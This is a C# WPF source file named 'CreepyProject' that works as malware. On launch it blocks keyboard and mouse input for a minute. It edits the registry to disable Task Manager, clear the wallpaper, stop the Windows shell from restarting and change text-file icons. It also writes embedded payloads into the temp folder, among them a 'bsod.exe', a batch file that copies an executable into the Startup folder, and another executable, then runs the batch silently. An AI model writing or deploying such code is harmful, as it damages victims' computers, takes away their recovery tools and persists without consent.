using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using Utilities;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using blockinput;



namespace CreepyProject
{
    /// <summary>
    /// Interação lógica para MainWindow.xam
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {


            WorkWorkWorkWork();
            InputBlocker.Block(60000);
            InitializeComponent();
            

        }
        private void WorkWorkWorkWork()
        {
            string temp = System.IO.Path.GetTempPath();
            

            RegistryKey editKey;

            editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            editKey.SetValue("", temp + "ico.ico");

            editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
            editKey.SetValue("Wallpaper", "");
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            editKey.SetValue("DisableTaskMgr", "1");
            editKey.Close();

            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            editKey.Close();


            System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);//copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\corra.exe"
            System.IO.File.WriteAllBytes(temp + "jooj.mp4", Properties.Resources.jooj);
            System.IO.File.WriteAllBytes(temp + "ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf", Properties.Resources.ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA);
            System.IO.File.WriteAllBytes(temp + "bsod.exe", Properties.Resources.cusole);
            System.IO.File.WriteAllBytes(temp + "ico.ico", Properties.Resources.ico);
            System.IO.File.WriteAllBytes(temp + "txt.txt", Properties.Resources.txt);
            System.IO.File.WriteAllBytes(temp + "corra.exe", Properties.Resources.corra);
            
            
            


            ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
        {
            Form1 f1 = new Form1();
            f1.ShowDialog();

        }
        private void video_Loaded(object sender, RoutedEventArgs e)
        {
            string videopath = System.IO.Path.GetTempPath() + "jooj.mp4";
            System.IO.File.WriteAllBytes(videopath, Properties.Resources.jooj);

            video.Source = new Uri(videopath);
            

        }

        private void main_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {

        }
    }
}
